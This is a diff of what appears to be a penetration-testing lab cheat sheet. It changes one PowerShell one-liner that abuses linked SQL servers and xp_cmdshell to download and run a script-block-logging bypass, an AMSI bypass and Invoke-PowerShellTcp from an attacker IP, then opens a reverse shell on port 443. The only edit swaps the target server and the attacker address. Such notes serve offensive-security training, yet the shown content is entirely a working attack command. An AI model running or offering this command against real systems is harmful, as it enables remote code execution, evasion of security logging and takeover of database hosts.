@@ -81,7 +81,7 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'c
 
 Reverseshell
 ```powershell
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.48/sbloggingbypass.txt); iex (iwr -UseBasicParsing http://172.16.100.48/amsibypass.txt); iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.48 -Port 443"''' -QueryTarget eu-sql35
+Get-SQLServerLinkCrawl -Instance dbserver31.tech.finance.corp -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt); iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt); iex (iwr http://172.16.100.1/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.1 -Port 443"''' 
 ```
 
 Manual
